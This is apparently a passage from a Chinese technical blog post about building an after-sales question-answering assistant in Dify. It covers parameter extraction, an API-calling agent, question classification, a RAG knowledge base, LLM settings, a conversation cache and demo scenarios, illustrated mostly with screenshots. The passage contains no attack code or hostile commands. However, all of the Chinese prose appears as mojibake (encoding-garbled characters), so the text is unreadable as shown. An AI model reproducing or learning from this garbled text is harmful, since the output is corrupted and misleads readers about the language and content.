<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/13442b49d4bf4992976cae75982567d2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=pmXQZeuUZ%2F%2FoaTgGgikjvJ95mPM%3D" alt="" loading="lazy"/></p>
<p>æ™ºèƒ½åŠ©æ‰‹å¹¶éç®€å•é—®ç­”æœºå™¨äººï¼Œè€Œæ˜¯é€šè¿‡å¤šå±‚AIèŠ‚ç‚¹ååŒå·¥ä½œï¼Œæ ¸å¿ƒåˆ©ç”¨èŠ‚ç‚¹è®¾è®¡å¦‚ä¸‹ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d456f6e2943e46cb8604b49772f1fc65~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=fme6m%2F9H8OTXtkYB1jjKw%2Bl057k%3D" alt="" loading="lazy"/></p>
<ol>
<li><strong>å‚æ•°æå–å™¨</strong>ï¼šè‡ªåŠ¨è¯†åˆ«å”®åå•å·ç­‰å…³é”®ä¿¡æ¯</li>
</ol>
<p>ä»ç”¨æˆ·é—®é¢˜ä¸­æå–å…³é”®å‚æ•°ï¼Œä¾‹å¦‚å”®åå•IDç­‰ã€‚å½“ç”¨æˆ·æé—®æ¶‰åŠå…·ä½“ä¸šåŠ¡å•æ®æ—¶ï¼Œç³»ç»Ÿè‡ªåŠ¨æå–æ ‡è¯†ä¿¡æ¯ï¼Œä¾›åç»­èŠ‚ç‚¹è°ƒç”¨ã€‚</p>













<table><thead><tr><th>difyé…ç½®</th><th>åº”ç”¨</th></tr></thead><tbody><tr><td><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9cc7e18b92f9486bba250f95026c30ef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=B4nPvFr0WNkK1Km8xKcdK63NabM%3D" alt="" loading="lazy"/>æŒ‡ä»¤å³æ˜¯æç¤ºè¯</td><td><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1f72fd850c184677b2c98c1833cc5e33~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=vP2j4qKnxwERE7EIXtIfPnSnPNc%3D" alt="" loading="lazy"/></td></tr></tbody></table>
<ol start="2">
<li><strong>Agentæ™ºèƒ½ä»£ç†</strong>ï¼šè°ƒç”¨çœŸå®ä¸šåŠ¡æ¥å£ï¼Œè·å–å®æ—¶æ•°æ®</li>
</ol>
<p>è´Ÿè´£è°ƒç”¨å¤–éƒ¨æ¥å£è·å–å®æ—¶ä¸šåŠ¡æ•°æ®ï¼Œå¹¶å¯¹è¿”å›ç»“æœè¿›è¡Œç»“æ„åŒ–è§£æã€‚ä¾‹å¦‚ï¼Œæ ¹æ®å”®åå•IDæŸ¥è¯¢è¯¦æƒ…ï¼Œå¹¶æå–çŠ¶æ€ã€å¤„ç†äººã€æ—¶é—´ç­‰å…³é”®å­—æ®µï¼Œè½¬åŒ–ä¸ºè‡ªç„¶è¯­è¨€æè¿°ã€‚</p>













<table><thead><tr><th>é…ç½®</th><th>åº”ç”¨</th></tr></thead><tbody><tr><td><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d95a50131bef46a0a90548f517eeb592~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=ib18nlkX%2FF5Uc0%2BKTRng%2Bl8N3Zs%3D" alt="" loading="lazy"/> æŒ‡ä»¤å³æ˜¯æç¤ºè¯</td><td>åŸæœ‰æ¥å£è¿”å›ç»“æ„<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2941b48feacd4d9898c6ca80850096fa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=H%2BGbvrwBuce4MulJ43LdWHRDdYw%3D" alt="" loading="lazy"/>æç¤ºè¯åè¿”å›ç»“æ„<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a6701a3c8df846ed8cf4d5112b4e5a91~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=XZRJv3xhTJHe3viAYgiPXKoxgBo%3D" alt="" loading="lazy"/></td></tr></tbody></table>
<ol start="3">
<li><strong>é—®é¢˜åˆ†ç±»å™¨</strong>ï¼šå°†é—®é¢˜åˆ†ä¸ºè§„åˆ™ç±»ã€æµç¨‹ç±»ã€æ•°æ®æ„é€ ç±»</li>
</ol>
<p>æ ¹æ®é—®é¢˜ç±»å‹å°†ç”¨æˆ·è¾“å…¥åˆ†æµè‡³ä¸åŒçš„å¤„ç†æµç¨‹ã€‚æˆ‘ä»¬å°†é—®é¢˜åˆ†ä¸ºä»¥ä¸‹å‡ ç±»ï¼š</p>
<p>â— ä¸šåŠ¡è§„åˆ™ç±»ï¼ˆéœ€æ£€ç´¢çŸ¥è¯†åº“ï¼‰</p>
<p>â— æµç¨‹æŒ‡å¼•ç±»ï¼ˆéœ€ç»„åˆé€»è¾‘è¯´æ˜ï¼‰</p>
<p>â— æ•°æ®æ„é€ ç±»ï¼ˆéœ€æ¨èæ„é€ æ–¹æ¡ˆï¼‰</p>
<p>åˆ†ç±»åï¼Œç³»ç»Ÿå¯è°ƒç”¨ç›¸åº”çš„æç¤ºè¯æ¨¡æ¿ä¸å¤„ç†é€»è¾‘ï¼Œæå‡å›ç­”å‡†ç¡®æ€§ã€‚</p>













<table><thead><tr><th>é…ç½®</th><th>åº”ç”¨</th></tr></thead><tbody><tr><td><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5b1f61f600d84bd3a717d6447c135a0c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=ZMjnIlP1LAWJFGuWcyKAuzD9Rs0%3D" alt="" loading="lazy"/></td><td><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/988e581c8ced45c090f1c3977b9852eb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=xqRakHcqR602DfUfptg6ZTZcnpk%3D" alt="" loading="lazy"/></td></tr></tbody></table>
<ol start="4">
<li><strong>çŸ¥è¯†åº“ï¼ˆRAGï¼‰</strong> ï¼šæ²‰æ·€ä¸šåŠ¡æ–‡æ¡£ã€FAQã€æµç¨‹è¯´æ˜ï¼Œç²¾å‡†æ£€ç´¢</li>
</ol>
<p>ç”¨äºå­˜å‚¨ä¸šåŠ¡æ–‡æ¡£ã€æµç¨‹è¯´æ˜ã€å¸¸è§é—®é¢˜ç­‰çŸ¥è¯†å†…å®¹ã€‚ä¾¿äºã€‚ç³»ç»Ÿæ ¹æ®ç”¨æˆ·é—®é¢˜ä»çŸ¥è¯†åº“ä¸­æ£€ç´¢åŒ¹é…ç›¸å…³å†…å®¹ï¼Œä½œä¸ºç”Ÿæˆå›ç­”çš„ä¾æ®ã€‚</p>




















<table><thead><tr><th/><th>é…ç½®</th><th>åº”ç”¨</th></tr></thead><tbody><tr><td>çŸ¥è¯†åº“æ•°æ®å†…å®¹</td><td>çŸ¥è¯†åº“ä¸Šä¼ æä¾›äº†å¾ˆå¤šæ–‡ä»¶æ ¼å¼ã€åˆ‡ç‰‡æ ¼å¼ï¼ˆåˆ‡ç‰‡ï¼šDifyçŸ¥è¯†åº“åˆ‡ç‰‡æ˜¯æŒ‡å°†ä¸Šä¼ åˆ°Difyå¹³å°çš„çŸ¥è¯†åº“æ–‡æ¡£æŒ‰ä¸€å®šè§„åˆ™åˆ†å‰²æˆæ›´å°ã€æ›´æ˜“ç®¡ç†çš„å†…å®¹å—ï¼ˆç§°ä¸ºâ€œchunksâ€ï¼‰çš„è¿‡ç¨‹ã€‚è¿™äº›åˆ‡ç‰‡æ˜¯çŸ¥è¯†åº“æ£€ç´¢å’Œåº”ç”¨çš„åŸºç¡€å•å…ƒï¼Œä¾¿äºAIæ¨¡å‹åœ¨ç”Ÿæˆå›ç­”æ—¶ç²¾å‡†å¼•ç”¨ç›¸å…³ä¿¡æ¯ã€‚â€Œï¼‰ æ–‡ä»¶ï¼š<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a8e63b3300504fe7a9e0cdba5b55d8e6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=5UqEQsEg%2BCBeWKVJYlUWHGYnOLE%3D" alt="" loading="lazy"/> åˆ‡ç‰‡æ ¼å¼ï¼šå¯æœ‰å¤šä¸ªé€‰æ‹©<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/862d9ec5876e4164b644f9710fa85c11~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=ly3y4ZoMJyFV0bIYu6noZTY0yN4%3D" alt="" loading="lazy"/> <img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/31d1bd9474764f188597dd47f42beae6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=XQFt6J%2BZNsOFeYwEXMmWpmupvF8%3D" alt="" loading="lazy"/></td><td/></tr><tr><td>RAGè·å–</td><td><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6176e42cf58744919a79994c70f598b0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=xekUggToeD8p7bKuq3LMHs8GgPs%3D" alt="" loading="lazy"/>é€šè¿‡é¢„è§ˆå¯æŸ¥çœ‹æ•ˆæœ <img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/da15dcb4a9e542868be411416afbcd92~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=j%2Bsqjuh9fGZrLwOQfRf2ylWn9pc%3D" alt="" loading="lazy"/> æ–¹å¼ä¸€ï¼šç›´æ¥è·å– æŒ‰åˆ‡ç‰‡åŒ¹é…æ’åº<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e65c462758114b1fb3a3207c68f60d3c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=maUO%2B8j139K4yb5g%2FFfwOqir4ao%3D" alt="" loading="lazy"/><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/beefe21418174fa689c462fbdc002959~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=Ar3x%2BUnOK9DBlJKVQMU%2B5eLNNfc%3D" alt="" loading="lazy"/> æ–¹å¼äºŒï¼šå¤§æ¨¡å‹æç¤ºè¯åŒ¹é…<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1735fe4c9da4440880aacb4bba077e8b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=VmM8r9UNgY6p7T1BfdxVjiANstg%3D" alt="" loading="lazy"/> <img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8e7b8af2d6d940a1981a85842e4dc0ae~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=0Gu3Ee9qLlOXhhsR%2FoKsGNiymk8%3D" alt="" loading="lazy"/> ç”±äºå¤§æ¨¡å‹åˆ†ææ—¶é—´è¾ƒé•¿ï¼Œä¸”æˆ‘ä»¬çŸ¥è¯†åº“ä¿¡æ¯ä¹Ÿæ¯”è¾ƒå…¨é¢çš„æƒ…å†µä¸‹å°±é‡‡å–åŒ¹é…è¿”å›å³å¯</td><td><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b05baa9410f645d59378caf1ed880688~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=1Gz8SG2FMOli1Z74rWeHhmpzZbc%3D" alt="" loading="lazy"/></td></tr></tbody></table>
<p>çŸ¥è¯†åº“å†…å®¹ç»“æ„å®ç°</p>
<p>â— æ•°æ®æ„é€ çŸ¥è¯†åº“</p>













<table><thead><tr><th>ç»“æ„</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td>åœºæ™¯ æè¿°+é“¾æ¥ æ­¥éª¤å¯¹åº”çŠ¶æ€ï¼š<strong>ç”¨æ¥åŒ¹é…æ•°æ®æ„é€ </strong> å…¥å‚ä»‹ç»ï¼š<strong>ç”¨æ¥æ¨èå‚æ•°å–å€¼</strong> æ–¹å¼ï¼šç»Ÿè®¡ç›®å‰å¸¸ç”¨æ•°æ®æ„é€ åœºæ™¯æ•´åˆè¾“å‡º <img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/944aa66af3b44eed9ce5588cb00fc8ef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=0jx80rjjNAgSGakrRP0qKqY5Hmk%3D" alt="" loading="lazy"/></td><td><strong>ä½¿ç”¨åœºæ™¯</strong>: é€€è´§é€€æ¬¾-æ½æ”¶æé€Ÿé€€ å…³é”®æ•°æ®æ„é€ é“¾æ¥: <a href="https://link.juejin.cn?target=https%3A%2F%2Fqe.*****.com%2FdataPt%2FsceneList%2F20570781%2F528%3FdId%3D7700" target="_blank" title="https://qe.*****.com/dataPt/sceneList/20570781/528?dId=7700" ref="nofollow noopener noreferrer">é€€è´§é€€æ¬¾-æ½æ”¶æé€Ÿé€€ æ•°æ®æ„é€ é“¾æ¥</a> æ­¤é“¾æ¥ç”¨äºåˆ›å»ºå’Œç®¡ç†é€€è´§æ¡ˆä¾‹ <img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e63757463740453a9a00df3e698e33f6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=XrvRIISDAWvfFM3cbM1eUQKBhPw%3D" alt="" loading="lazy"/></td></tr></tbody></table>
<p>â— ä¸šåŠ¡çŸ¥è¯†åº“</p>













<table><thead><tr><th>ç»“æ„</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td>åŠŸèƒ½æ¦‚è¿° é€»è¾‘æ•´ç† æ–¹å¼ï¼šå¯åˆ©ç”¨Cursoré˜…è¯»æŠ€æœ¯æ–¹æ³•ï¼Œæ¥åˆ†æé€»è¾‘è¾“å‡º <img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e5ef939264354022b0e9cb0cf05e9efc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=MqSdEzVVkVrgl5xQsrb5UYU7JzE%3D" alt="" loading="lazy"/></td><td><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5e14ee620acd4a398fd5d923cec22429~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=THkyfNt5zRUM0R7cv6C4bB4KQGA%3D" alt="" loading="lazy"/></td></tr></tbody></table>
<ol start="5">
<li><strong>å¤§è¯­è¨€æ¨¡å‹èŠ‚ç‚¹</strong>ï¼šæ•´åˆä¿¡æ¯ï¼Œç”Ÿæˆè‡ªç„¶è¯­è¨€å›ç­”</li>
</ol>
<p>æ•´åˆçŸ¥è¯†åº“å†…å®¹ã€å®æ—¶æ•°æ®ä¸ç”¨æˆ·é—®é¢˜ï¼Œç”Ÿæˆè‡ªç„¶è¯­è¨€å›ç­”ã€‚æˆ‘ä»¬æ ¹æ®åœºæ™¯é€‰æ‹©åˆé€‚çš„æ¨¡å‹ï¼Œå¹¶é…ç½®æ¸©åº¦ã€æƒ©ç½šå‚æ•°ç­‰ï¼Œä»¥æ§åˆ¶å›ç­”çš„å‡†ç¡®æ€§ä¸åˆ›é€ æ€§ã€‚</p>













<table><thead><tr><th>é…ç½®</th><th>åº”ç”¨</th></tr></thead><tbody><tr><td><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bda6ff8c7e144a1e8f71b126c5f4a6b0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=le%2FKwPIEelDrE6QQjy7p8VeGgYI%3D" alt="" loading="lazy"/>æ¨¡å‹é€‰æ‹©å’Œå‚æ•°ï¼šæ¨¡å‹å‚æ•°æ§åˆ¶å“åº”ç”Ÿæˆã€‚ æ¸©åº¦èŒƒå›´ä» 0ï¼ˆç¡®å®šæ€§ï¼‰åˆ° 1ï¼ˆåˆ›é€ æ€§ï¼‰ã€‚ æ ¸é‡‡æ ·é€šè¿‡æ¦‚ç‡é™åˆ¶è¯æ±‡é€‰æ‹©ã€‚é¢‘ç‡æƒ©ç½šå‡å°‘é‡å¤ã€‚å­˜åœ¨æƒ©ç½šé¼“åŠ±æ–°è¯é¢˜ã€‚ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨é¢„è®¾ï¼šç²¾ç¡®ã€å¹³è¡¡æˆ–åˆ›æ„ã€‚  æç¤ºè¯é…ç½®ï¼šä½ çš„ç•Œé¢æ ¹æ®æ¨¡å‹ç±»å‹è‡ªé€‚åº”ã€‚èŠå¤©æ¨¡å‹ä½¿ç”¨æ¶ˆæ¯è§’è‰²ï¼ˆç³»ç»Ÿç”¨äºè¡Œä¸ºï¼Œç”¨æˆ·ç”¨äºè¾“å…¥ï¼ŒåŠ©æ‰‹ç”¨äºç¤ºä¾‹ï¼‰ï¼Œè€Œå®Œæˆæ¨¡å‹ä½¿ç”¨ç®€å•çš„æ–‡æœ¬ç»­å†™ã€‚ <img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/22757720c24e4b8fba5bd58ae679acda~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=BlNxBdfGI6nA8E7P4suYONIqHqg%3D" alt="" loading="lazy"/></td><td><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ff11f99ad98e4b71825b5fca644f58b5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=XcBpPUZRaLiiAxWvlQZFOPHKr0M%3D" alt="" loading="lazy"/></td></tr></tbody></table>
<p>Tipsï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f8d88e9c433343a88c743d20b6406bcb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=q83IXHszRakEovzwpGqyRWbEAAw%3D" alt="" loading="lazy"/></p>
<ol start="6">
<li><strong>å¯¹è¯ç¼“å­˜</strong>ï¼šæ”¯æŒå¤šè½®å¯¹è¯ï¼Œè®°å¿†ä¸Šä¸‹æ–‡ï¼Œä½“éªŒæ›´è¿è´¯</li>
</ol>
<p>ä¸ºå®ç°å¤šè½®å¯¹è¯æ”¯æŒï¼Œç³»ç»Ÿé€šè¿‡ç¼“å­˜è®°å½•å½“å‰ä¼šè¯çš„å…³é”®ä¿¡æ¯ï¼ˆå¦‚å”®åå•IDï¼‰ï¼Œä½¿å¾—ç”¨æˆ·åœ¨åç»­æé—®ä¸­æ— éœ€é‡å¤è¾“å…¥ï¼Œæå‡äº¤äº’è¿è´¯æ€§ã€‚</p>













<table><thead><tr><th>é…ç½®</th><th>åº”ç”¨</th></tr></thead><tbody><tr><td><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/56a622ba9d6e47968ddf3f9ad1c17571~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=6Sdb1IyxxPg3eRMBMrZRcq%2Ba624%3D" alt="" loading="lazy"/> <img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d02c552c749e4f6f934c2f0326344afe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=8EtmWpoAF7iqZ%2FMD8A%2BxTDjV5%2BI%3D" alt="" loading="lazy"/></td><td><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/679911d580e94d7eaf2c45bceb9df559~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=OPtu9FmlYF99vkBiu1adqLUChqA%3D" alt="" loading="lazy"/></td></tr></tbody></table>
<h2 data-id="heading-10">äº”ã€å·²å®ç°åœºæ™¯æ¼”ç¤º</h2>
<h3 data-id="heading-11">ğŸ“Œ åœºæ™¯ä¸€ï¼šå”®åå•å®æ—¶çŠ¶æ€æŸ¥è¯¢</h3>
<p>ç”¨æˆ·è¾“å…¥å”®åå•å·ï¼Œç³»ç»Ÿè‡ªåŠ¨æ‹‰å–æœ€æ–°çŠ¶æ€ã€å¤„ç†äººã€æ—¶é—´èŠ‚ç‚¹ï¼Œå¹¶ç»™å‡ºä¸šåŠ¡è§£é‡Šã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/21c47990bdee4520a312712f642848bd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=TtOlx%2B8XbT6rNdZOIwISPTygAqI%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-12">ğŸ“Œ åœºæ™¯äºŒï¼šåŸºäºå•å·çš„ä¸šåŠ¡é€»è¾‘è¿½é—®</h3>
<p>ä¾‹å¦‚ï¼šâ€œä¸ºä»€ä¹ˆè¿™ä¸ªå”®åå•ä¸èƒ½èµ°æé€Ÿé€€ï¼Ÿâ€ç³»ç»Ÿç»“åˆå•å·æ•°æ®ä¸ä¸šåŠ¡è§„åˆ™ï¼Œç»™å‡ºæ˜ç¡®åŸå› ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ffdebdcd576c434daa66cfdeca800bcc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=yaT0DBHhTln3AbPc80W5PI8C2O0%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-13">ğŸ“Œ åœºæ™¯ä¸‰ï¼šæ•°æ®æ„é€ æŒ‡å¯¼</h3>
<p>é’ˆå¯¹æµ‹è¯•åœºæ™¯ï¼Œæ¨èæ•°æ®æ„é€ æ–¹æ¡ˆï¼Œå¹¶é™„å¸¦ç¤ºä¾‹é“¾æ¥ä¸å‚æ•°å»ºè®®ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9fbc567114ed4cb59313a59740b576b0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=JDh%2FfBM7tHh43c9xYYpWkNlq0gI%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-14">ğŸ“Œ åœºæ™¯å››ï¼šæ— å•å·çº¯é€»è¾‘ç­”ç–‘</h3>
<p>å³ä½¿æ²¡æœ‰å•å·ï¼Œä¹Ÿèƒ½å›ç­”è¯¸å¦‚â€œä»€ä¹ˆæƒ…å†µä¸‹ä¼šè§¦å‘è´¨æ£€ï¼Ÿâ€ç­‰é€šç”¨è§„åˆ™é—®é¢˜ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/45c028a890e3435585e115be0a257e0d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=Px%2FnkYyUJd7BQbZ%2Fb49SGjmJ7zk%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-15">å…­ã€æ•ˆæœå·²ç°ï¼Œä¼˜åŒ–æŒç»­</h2>
<p>ç›®å‰ï¼Œæ™ºèƒ½åŠ©æ‰‹å·²åˆæ­¥è¦†ç›–å”®åæ ¸å¿ƒé—®ç­”åœºæ™¯ï¼Œå“åº”é€Ÿåº¦æå‡è‡³ç§’çº§ï¼ŒäººåŠ›é‡Šæ”¾æ˜¾è‘—ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†ï¼š</p>
<ol>
<li>æŒç»­æ‰©å……çŸ¥è¯†åº“ï¼Œè¦†ç›–æ›´å¤šä¸šåŠ¡åˆ†æ”¯</li>
<li>ä¼˜åŒ–é—®é¢˜åˆ†ç±»å‡†ç¡®ç‡ï¼Œæ”¯æŒæ›´ç»†ç²’åº¦é—®ç­”</li>
<li>å¢å¼ºå¤šè½®å¯¹è¯èƒ½åŠ›ï¼Œå¤„ç†å¤æ‚é—®é¢˜é“¾</li>
